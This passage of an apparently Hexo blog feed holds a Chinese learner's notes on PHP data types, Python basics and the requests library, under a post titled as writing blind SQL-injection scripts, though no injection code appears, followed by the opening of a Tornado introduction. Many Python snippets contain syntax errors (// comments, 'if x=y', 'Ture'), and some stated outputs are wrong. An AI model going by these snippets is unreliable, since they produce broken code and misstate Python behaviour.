<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>在PHP中，其实””和’’里面都是可以加要输出的文本的，和C有些不一样         <a id="more"></a></p>
<h3 id="整型，浮点型，布尔型，数组，对象"><a href="#整型，浮点型，布尔型，数组，对象" class="headerlink" title="整型，浮点型，布尔型，数组，对象"></a>整型，浮点型，布尔型，数组，对象</h3><p>这里要先引入一个函数var_dump($变量字符)，他是可以用来返回变量的数据类型和值（这句话没有很理解，返回值的意思是我发出一个值，通过这个函数，返回来了另一个值？但是后面又说没有返回值？？）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">$a = <span class="string">&quot;alsdflasdf;a&quot;</span>;</span><br><span class="line">$b = var_dump($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($c);</span></span><br><span class="line">$d=var_dump($c);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//输出一个换行符的意思</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//同理</span></span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>输出的值为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(12) &quot;alsdflasdf;a&quot;&#x2F;&#x2F;这边的string（12）的意思是输出的第一个元素类型长度为12</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">alsdflasdf;a</span><br></pre></td></tr></table></figure>

<p>这里分析一下这个var_dump吧，从上面这个代码分析可以看出该函数和echo的输出类型不太一样</p>
<p>在php下:<br>echo 输出的是变量和字符串;</p>
<p>var_dump 输出的是变量类型,变量长度和变量值,输出的会更详细;</p>
<p><strong>接下来是整型变量</strong></p>
<p>感觉和C的没多大差别，就不着重讲了，以后遇到特别的没想到的再来补充</p>
<p><strong>浮点型</strong><br>同理整型<br><strong>布尔型</strong><br>感觉不是很懂<a href="https://www.cnblogs.com/xielong/p/9874955.html%E5%85%88%E8%AE%B0%E5%BD%95%E7%BD%91%E5%9D%80%EF%BC%8C%E4%BB%A5%E5%90%8E%E9%81%87%E5%88%B0%E5%85%B7%E4%BD%93%E9%97%AE%E9%A2%98%E7%9A%84%E5%86%8D%E6%9D%A5%E5%9B%9E%E9%A1%BE">https://www.cnblogs.com/xielong/p/9874955.html先记录网址，以后遇到具体问题的再来回顾</a><br><strong>数组</strong><br>数组:可以在一个变量中存储多个值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$cars=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">var_dump($cars);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Volvo&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;BMW&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;Toyota&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就可以把数组内容完全输出出来，但是你用echo就只能输出array？还是挺神奇的。<br><strong>PHP对象</strong><br>首先需要用<strong>class关键字</strong>声明类对象<br>这个格式是这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>    <span class="title">Person</span>//类名</span></span><br><span class="line"><span class="class"></span>&#123;       <span class="comment">//括号里写类的定义</span></span><br><span class="line">     <span class="keyword">public</span> $age; <span class="comment">//属性对应的是变量</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span> (<span class="params"></span>) //行为对应的是方法</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">&#x27;我在吃饭&#x27;</span>;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">$xiaoming = <span class="keyword">new</span> Person();<span class="comment">//小括号可加可不加，推荐都加</span></span><br><span class="line">var_dump($xiaoming- &gt;age = <span class="number">18</span>)；<span class="comment">//通过对象来访问自己的属性和方法添加-&gt;(你要访问的属性和方法的字符)，前面无$，然后这个age也可以在上面写一行$xiaoming- &gt;age = 18;，然后下面写var_dump($xiaoming-&gt;age);</span></span><br><span class="line">$xiaoming-&gt;eat()；<span class="comment">//这样就可以访问自己的方法，后面有括号</span></span><br></pre></td></tr></table></figure>

<p>创建对象的第二个方法</p>
<p>$name = ‘person’;</p>
<p>$xiaoming = new $name();</p>
<p>命名规范 类名遵从大驼峰原则：</p>
<p>persontest====&gt;PersonTest(每个单词的首字母要大写)<br>这里才陈述一下创建对象的意义吧：<br><u>创建完对象的类别，并且定义好他的属性，下次在运用时，你只要$(想要赋值的变量)=new （你定义的类）（）</u><br><u>这样你想要赋值的变量就可以拥有类别的属性，并且可以在细操属性的值。</u></p>
<p>后续如果需要继续学习对象相关知识，再来补充<br><strong>接下来是PHP NULL值</strong></p>
<p>就是表示一个变量为空值，可以直接设置NULL来清空一个变量的值<br>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">$x=<span class="literal">null</span>;</span><br><span class="line">var_dump($x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个比较简单就不过多陈述了</p>
<p>今天先到这里了，下次再来继续</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python编写盲注脚本</title>
    <url>/2020/12/24/postPython%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>Python基本语法：                               <a id="more"></a></p>
<h3 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&quot;True&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;ansewe&quot;</span>)//同一个层次的代码缩进要一致，python语言用同缩进的多少表示是否为同一层次，是否为一个代码段</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">score = <span class="number">87</span></span><br><span class="line"><span class="keyword">if</span> score &gt;=<span class="number">90</span> <span class="keyword">and</span> score &lt;=<span class="number">100</span>:</span><br><span class="line">    print(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;=<span class="number">80</span> <span class="keyword">and</span> &lt;<span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&quot;B&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="引入库（随机数）"><a href="#引入库（随机数）" class="headerlink" title="引入库（随机数）"></a>引入库（随机数）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">x = random.randint(<span class="number">0</span>,<span class="number">2</span>) <span class="comment">#随机生成0 1 2</span></span><br><span class="line">print(<span class="string">&quot;%d&quot;</span>%x)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=input(请输入数字)</span><br><span class="line">y=random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> x=y:</span><br><span class="line">    print(你们出的一样)</span><br><span class="line"><span class="keyword">elif</span> x=<span class="number">0</span> <span class="keyword">and</span> y=<span class="number">1</span> :</span><br><span class="line">    print(<span class="string">&quot;我出的是剪刀，你输啦&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p><strong>for完有一个冒号记得填写</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)://循环从<span class="number">0</span>开始一共五次</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">10</span>,<span class="number">3</span>)//循环从<span class="number">0</span>开始一直到<span class="number">10</span> 每次增加<span class="number">3</span>次</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">-10</span>,<span class="number">-100</span>,<span class="number">-30</span>)//循环从<span class="number">-10</span>开始一直到<span class="number">-100</span> 每次减少<span class="number">30</span>次</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure>

<p><strong>对于字符</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;chengdu&quot;</span></span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> name:</span><br><span class="line">      print(x)//针对字符，输出的是chengdu（有换行），不换行加一个,end=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;bb&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;dd&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))</span><br><span class="line">print(i,a[i])// 这里的len指的是输出a当中元素的个数，为四个所以循环为<span class="number">0</span><span class="number">-4</span>，然后打印出来</span><br></pre></td></tr></table></figure>

<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">5</span>:</span><br><span class="line"> print(<span class="string">&quot;当前是第%d次执行循环&quot;</span>%(i+<span class="number">1</span>))</span><br><span class="line"> print(<span class="string">&quot;i=%d&quot;</span>%i)</span><br><span class="line"> i +=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">n=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=n:</span><br><span class="line">    a=a+i</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;1-%d的和=%d&quot;</span>%(n,a)//<span class="number">1</span><span class="number">-100</span>求和</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> cout&lt;<span class="number">5</span>:</span><br><span class="line">    print(count,<span class="string">&quot;小于5&quot;</span>)</span><br><span class="line">    count +=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(count,<span class="string">&quot;大于或等于5&quot;</span>)//不止是<span class="keyword">if</span>可以加<span class="keyword">else</span> <span class="keyword">while</span>也可以</span><br><span class="line">//输出结果：</span><br><span class="line"><span class="number">0</span> 小于<span class="number">5</span></span><br><span class="line"><span class="number">1</span> 小于<span class="number">5</span></span><br><span class="line"><span class="number">2</span> 小于<span class="number">5</span></span><br><span class="line"><span class="number">3</span> 小于<span class="number">5</span></span><br><span class="line"><span class="number">4</span> 小于<span class="number">5</span></span><br><span class="line"><span class="number">5</span> 大于或等于<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h3 id="break-continue-pass"><a href="#break-continue-pass" class="headerlink" title="break/continue/pass"></a>break/continue/pass</h3><p>break：终止循环<br>continue：本次循环终止<br>pass：纯属占位</p>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word=<span class="string">&#x27;this&#x27;</span></span><br><span class="line">sentence=<span class="string">&quot;this is a word&quot;</span></span><br><span class="line">paragraphy=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  this is a paragarphy</span></span><br><span class="line"><span class="string">  可以换行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">print(word)</span><br><span class="line">print(sentence)</span><br><span class="line">print(paragraphy)</span><br><span class="line">//需要转义 的字符 \\ \<span class="string">&#x27; \&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="字符串函数str"><a href="#字符串函数str" class="headerlink" title="字符串函数str"></a>字符串函数str</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;chengdu&quot;</span></span><br><span class="line">print(str[<span class="number">0</span>:<span class="number">6</span>:<span class="number">2</span>])// str[起始位置:结束位置:步进值(可选，默认为<span class="number">1</span>)]</span><br></pre></td></tr></table></figure>

<h5 id="字符串相连接"><a href="#字符串相连接" class="headerlink" title="字符串相连接"></a>字符串相连接</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;chengdu&quot;</span></span><br><span class="line">print(str+<span class="string">&quot;,你好&quot;</span>)//打印chengdu，你好</span><br><span class="line">print(str*<span class="number">3</span>)//打印三次</span><br><span class="line">print(<span class="string">r&quot;hello\nchengdu&quot;</span>)//前面有r 里面的内容会原样输出 比如\n就不会转义</span><br></pre></td></tr></table></figure>

<h5 id="字符串的常见操作"><a href="#字符串的常见操作" class="headerlink" title="字符串的常见操作"></a>字符串的常见操作</h5><p><strong>1.bytes.decode(encoding=”utf-8”, errors=”strict”</strong><br>Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。<br><strong>2.encode(encoding=’UTF-8’,errors=’strict’</strong><br>以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’<br><strong>3.isalnum()</strong><br>如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False<br><strong>4.isalpha()</strong><br>如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False<br><strong>5.isdigit()</strong><br>如果字符串只包含数字则返回 True 否则返回 False<br><strong>6.isnumeric()</strong><br>如果字符串中只包含数字字符，则返回 True，否则返回 False<br><strong>7.join(seq)</strong><br>以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串<br><strong>8.len(string)</strong><br>返回字符串长度<br><strong>9.istrip()</strong><br>截掉字符串左边的空格或指定字符<br><strong>10rstrip()</strong><br>删除字符串末尾的空格<br><strong>11split(str=””, num=string.count(str))</strong><br>以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><h5 id="定义-增加"><a href="#定义-增加" class="headerlink" title="定义+增加"></a>定义+增加</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">namelist=[<span class="number">1</span>,<span class="string">&#x27;huang&#x27;</span>,<span class="number">3</span>]//定义一个列表</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> namelist:</span><br><span class="line">    print(name) //遍历输出namelist</span><br><span class="line"> //使用<span class="keyword">while</span>遍历输出数组</span><br><span class="line">length=len(namelist)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;length:</span><br><span class="line">    print(namelist[i])</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">//append在数字末尾增加一个值</span><br><span class="line">//eg1.</span><br><span class="line">nametemp=input(<span class="string">&quot;请输入数字:&quot;</span>)</span><br><span class="line">namelist.append(nametemp)</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> namelist:</span><br><span class="line">    print(num)  </span><br><span class="line">eg2.</span><br><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">a.append(b)// 将列表当做一个元素加入到a列表中</span><br><span class="line">//结果是 [<span class="number">1</span>,<span class="number">2</span>,[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">extend(b)</span><br><span class="line">print(a)</span><br><span class="line">//结果是[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">//insert：指定下标位置插入元素</span><br><span class="line">a=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">a.insert(<span class="number">1</span>,<span class="number">3</span>) <span class="comment">#第一个变量表示小标，第二个变量表示元素（对象）</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//<span class="keyword">del</span> 在指定位置删除一个元素</span><br><span class="line">a=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">del</span> a[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">     print(i)</span><br><span class="line">//pop() 弹出末尾最后一个元素</span><br><span class="line">a.pop()</span><br><span class="line">//remove 直接删除指定内容的元素</span><br><span class="line">a.remove(<span class="number">1</span>)//如果有重复的数据比如[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]只删除找到的第一个</span><br></pre></td></tr></table></figure>

<h5 id="更改"><a href="#更改" class="headerlink" title="更改"></a>更改</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;[1,1,1]</span><br><span class="line">a[1]&#x3D;2&#x2F;&#x2F;直接改就行</span><br></pre></td></tr></table></figure>

<h5 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//使用条件判断语句</span><br><span class="line">findnumeber=input(<span class="string">&quot;请输入你要查找的数字&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> findnumber <span class="keyword">in</span> a:</span><br><span class="line"> print(<span class="string">&quot;在&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> print(<span class="string">&quot;不在&quot;</span>)</span><br><span class="line">//使用index函数</span><br><span class="line">a=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>]</span><br><span class="line">print(a.index(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>,<span class="number">4</span>))//查找a这个元素在下标<span class="number">1</span><span class="number">-4</span>都出现在哪里 结果返回的是数组下标，并且范围是左闭右开的</span><br><span class="line">//使用count计数某个元素出现几次</span><br><span class="line">print(mylist.count(<span class="string">&quot;c&quot;</span>))</span><br></pre></td></tr></table></figure>

<h5 id="拓展"><a href="#拓展" class="headerlink" title="拓展:"></a>拓展:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//排序和反转</span><br><span class="line">a=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">a.reverse() //将列表所有元素反转</span><br><span class="line">a.sort() //升序排序</span><br><span class="line">a.sort(reverse=Ture)//降序排序</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//类二位数组:</span><br><span class="line">a=[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>]]</span><br><span class="line">print(a[<span class="number">0</span>])//输出[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">print(a[<span class="number">0</span>][<span class="number">0</span>])//输出[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>三个办公室，八个老师，随机分配到三个办公室并将其打印</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">offices=[[],[],[]]</span><br><span class="line">names=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    index = random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    offices[index].append(name)</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> office <span class="keyword">in</span> offices:</span><br><span class="line">    print(<span class="string">&quot;%d:%d&quot;</span>%(i,len(office)))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> office:</span><br><span class="line">        print(<span class="string">&quot;%s&quot;</span>%name,end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;-&quot;</span>*<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tup1=() //创建一个空的元组</span><br><span class="line">tup2=(<span class="number">50</span>)//此时不是元组 type为int</span><br><span class="line">tup3=(<span class="number">50</span>,)//加一个逗号才能表示他是一个元组</span><br></pre></td></tr></table></figure>



<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;def:定义函数</span><br></pre></td></tr></table></figure>

<h2 id="Requests库学习"><a href="#Requests库学习" class="headerlink" title="Requests库学习"></a>Requests库学习</h2><p>导入requests模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure>

<p>然后，尝试获取某个页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;url&#x27;</span>)//get请求</span><br><span class="line">r = requests.post(<span class="string">&#x27;url&#x27;</span>，data=&#123;<span class="string">&#x27;key&#x27;</span>=<span class="string">&#x27;value&#x27;</span>&#125;)//post请求</span><br></pre></td></tr></table></figure>

<p>其他HTTP请求类型也是如此</p>
<h3 id="传递URL参数"><a href="#传递URL参数" class="headerlink" title="传递URL参数"></a>传递URL参数</h3><h5 id="在url中传递数据："><a href="#在url中传递数据：" class="headerlink" title="在url中传递数据："></a>在url中传递数据：</h5><p> Requests 允许你使用 <code>params</code> 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 <code>key1=value1</code> 和 <code>key2=value2</code> 到 <code>httpbin.org/get</code> ，那么你可以使用如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;<span class="string">&#x27;key1&#x27;</span>:<span class="string">&#x27;value1&#x27;</span>,<span class="string">&#x27;key2&#x27;</span>:<span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>,params=payload)</span><br></pre></td></tr></table></figure>

<p>返回输出结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">print(r.url)</span><br><span class="line">//http://httpbin.org/get?key2=value2&amp;key1=value1</span><br></pre></td></tr></table></figure>

<p>**ps:**字典里的none值得键不会被添加到URL的查询字符串中</p>
<h3 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h3><h4 id="读取服务器响应的内容："><a href="#读取服务器响应的内容：" class="headerlink" title="读取服务器响应的内容："></a>读取服务器响应的内容：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">&#x27;URL&#x27;</span>)</span><br><span class="line">r.text</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="会话对象"><a href="#会话对象" class="headerlink" title="会话对象:"></a>会话对象:</h4><p>会话对象让你能够跨请求保持某些参数。它也会在同一个session实例发出的所有请求之间保持cookie。</p>
<h5 id="跨请求保持一些cookie"><a href="#跨请求保持一些cookie" class="headerlink" title="跨请求保持一些cookie"></a>跨请求保持一些cookie</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(<span class="string">&quot;http://httpbin.org/cookies&quot;</span>)</span><br><span class="line">print(r.text)</span><br><span class="line"><span class="comment"># &#x27;&#123;&quot;cookies&quot;: &#123;&quot;sessioncookie&quot;: &quot;123456789&quot;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<p>参考文章:<a href="https://2.python-requests.org/zh_CN/latest/user/quickstart.html">https://2.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><a href="https://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced">https://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced</a></p>
<h2 id="python版本更换指令"><a href="#python版本更换指令" class="headerlink" title="python版本更换指令"></a>python版本更换指令</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">py <span class="number">-2.7</span></span><br><span class="line">py <span class="number">-3</span></span><br></pre></td></tr></table></figure>

<h2 id="1、字符串前加-f"><a href="#1、字符串前加-f" class="headerlink" title="1、字符串前加 f"></a><strong>1、字符串前加 f</strong></h2><p>字符串格式化（python 3.6 新增，类似于perl中的变量内插）</p>
<p>例： vers = ‘python 3.6’</p>
<p>f”该功能是{vers}新增”</p>
<p>返回：该功能是python 3.6新增</p>
<p>格式化的字符串文字前缀为”f”，类似str.format()。包含由花括号包围的替换区域。替换字段是表达式，在运行时进行评估，然后使用format()协议进行格式化。</p>
<h2 id="2、字符串前加-u"><a href="#2、字符串前加-u" class="headerlink" title="2、字符串前加 u"></a><strong>2、字符串前加 u</strong></h2><p>例：u”我是含有中文字符组成的字符串。”</p>
<p>作用：后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</p>
<h2 id="3、字符串前加-r"><a href="#3、字符串前加-r" class="headerlink" title="3、字符串前加 r"></a><strong>3、字符串前加 r</strong></h2><p>例：r”\n\t\n”</p>
<p>返回：\n\t\n</p>
<p>作用：声明后面的字符串是普通字符串，相对的，特殊字符串中含有：转义字符 \n \t 什么什么的。</p>
<h2 id="4、字符串前加-b"><a href="#4、字符串前加-b" class="headerlink" title="4、字符串前加 b"></a><strong>4、字符串前加 b</strong></h2><p>作用：python3.x里默认的str是unicode类,</p>
<p>py2.x的str是 bytes类,</p>
<p>b“我(python 3)的str是 bytes” 代表的就是bytes类 。</p>
<p>python2.x里, b前缀没什么具体意义， 只是为了兼容python3.x的这种</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>python Tornado学习</title>
    <url>/2021/03/03/python-Tornado%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><p>Tornado是使用Python编写的一个强大的、可扩展的Web服务器<a id="more"></a></p>
<h2 id="运行服务："><a href="#运行服务：" class="headerlink" title="运行服务："></a>运行服务：</h2><p>真正使得Tornado运转起来的语句。首先，我们使用Tornado的options模块来解析命令行。然后我们创建了一个Tornado的Application类的实例。传递给Application类__init__方法的最重要的参数是handlers。它告诉Tornado应该用哪个类来响应请求。马上我们讲解更多相关知识。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http_server = tornado.httpserver.HTTPServer(app)</span><br><span class="line">http_server.listen(options.port)</span><br><span class="line">tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure>

<p>从这里开始的代码将会被反复使用：一旦Application对象被创建，我们可以将其传递给Tornado的HTTPServer对象，然后使用我们在命令行指定的端口进行监听（通过options对象取出。）最后，在程序准备好接收HTTP请求后，我们创建一个Tornado的IOLoop的实例。</p>
<h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><p>一个Tornado模板仅仅是用一些标记把Python控制序列和表达式嵌入 HTML(或者任意其他文本格式)的文件中:</p>
